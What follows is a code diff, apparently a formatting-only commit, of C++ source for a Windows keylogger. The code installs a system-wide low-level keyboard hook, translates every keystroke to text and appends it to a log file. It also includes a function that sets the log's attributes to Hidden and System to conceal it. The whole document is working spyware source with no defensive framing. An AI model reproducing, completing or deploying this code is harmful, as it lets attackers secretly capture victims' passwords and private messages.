@@ -1,13 +1,13 @@
 #include "KeyLogger.hpp"
 
 // thread-local instance used by the hook in this thread
-KeyLogger* KeyLogger::s_instance = nullptr;
+KeyLogger *KeyLogger::s_instance = nullptr;
 
 /**
  * @brief Constructs a KeyLogger bound to a filename.
  * @param filename Path where keystrokes will be logged.
  */
-KeyLogger::KeyLogger(const std::string& filename)
+KeyLogger::KeyLogger(const std::string &filename)
     : hook(nullptr), filePath(filename), running(false), threadId(0)
 {
     s_instance = this;
@@ -27,21 +27,25 @@ KeyLogger::~KeyLogger()
 void KeyLogger::start()
 {
     outFile.open(filePath, std::ios::app);
-    if (!outFile.is_open()) return;
+    if (!outFile.is_open())
+        return;
 
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
-    if (!hook) return;
+    if (!hook)
+        return;
 
     running = true;
     threadId = GetCurrentThreadId();
 
     MSG msg;
-    while (running && GetMessage(&msg, nullptr, 0, 0)) {
+    while (running && GetMessage(&msg, nullptr, 0, 0))
+    {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    if (hook) {
+    if (hook)
+    {
         UnhookWindowsHookEx(hook);
         hook = nullptr;
     }
@@ -54,7 +58,8 @@ void KeyLogger::start()
 void KeyLogger::stop()
 {
     running = false;
-    if (threadId != 0) {
+    if (threadId != 0)
+    {
         PostThreadMessage(threadId, WM_QUIT, 0, 0);
     }
 }
@@ -66,11 +71,13 @@ void KeyLogger::stop()
 std::string KeyLogger::getLoggedData()
 {
     std::ifstream inFile(filePath);
-    if (!inFile.is_open()) return "";
+    if (!inFile.is_open())
+        return "";
 
     std::ostringstream oss;
     std::string line;
-    while (std::getline(inFile, line)) {
+    while (std::getline(inFile, line))
+    {
         oss << line << "\n";
     }
     return oss.str();
@@ -88,7 +95,7 @@ void KeyLogger::clearLogFile()
  * @brief Hide a file by setting its attributes to Hidden and System.
  * @param filename File path to hide.
  */
-void KeyLogger::hideFile(const std::string& filename)
+void KeyLogger::hideFile(const std::string &filename)
 {
     SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
@@ -97,7 +104,7 @@ void KeyLogger::hideFile(const std::string& filename)
  * @brief Unhide a file by resetting its attributes to normal.
  * @param filename File path to unhide.
  */
-void KeyLogger::unhideFile(const std::string& filename)
+void KeyLogger::unhideFile(const std::string &filename)
 {
     SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_NORMAL);
 }
@@ -107,8 +114,9 @@ void KeyLogger::unhideFile(const std::string& filename)
  */
 LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    if (nCode == HC_ACTION && wParam == WM_KEYDOWN && s_instance) {
-        KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+    if (nCode == HC_ACTION && wParam == WM_KEYDOWN && s_instance)
+    {
+        KBDLLHOOKSTRUCT *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
         DWORD vkCode = kbStruct->vkCode;
 
         BYTE keyboardState[256];
@@ -130,17 +138,20 @@ void KeyLogger::processKeyEvent(DWORD vkCode, BYTE keyboardState[256])
     HKL layout = GetKeyboardLayout(0);
     int result = ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 4, 0, layout);
 
-    if (result > 0) {
+    if (result > 0)
+    {
         char utf8Char[5] = {0};
         int len = WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Char, sizeof(utf8Char), nullptr, nullptr);
-        if (len > 0 && outFile.is_open()) {
+        if (len > 0 && outFile.is_open())
+        {
             outFile.write(utf8Char, len);
             outFile.flush();
         }
         return;
     }
 
-    if (!outFile.is_open()) return;
+    if (!outFile.is_open())
+        return;
 
     static const std::unordered_map<DWORD, std::string> specialKeys = {
         {VK_RETURN, "[ENTER]"}, {VK_BACK, "[BACK]"}, {VK_SPACE, " "}, {VK_TAB, "[TAB]"},
@@ -158,9 +169,12 @@ void KeyLogger::processKeyEvent(DWORD vkCode, BYTE keyboardState[256])
     };
 
     auto it = specialKeys.find(vkCode);
-    if (it != specialKeys.end()) {
+    if (it != specialKeys.end())
+    {
         outFile << it->second;
-    } else {
+    }
+    else
+    {
         outFile << "[UNK:" << vkCode << "]";
     }
     outFile.flush();
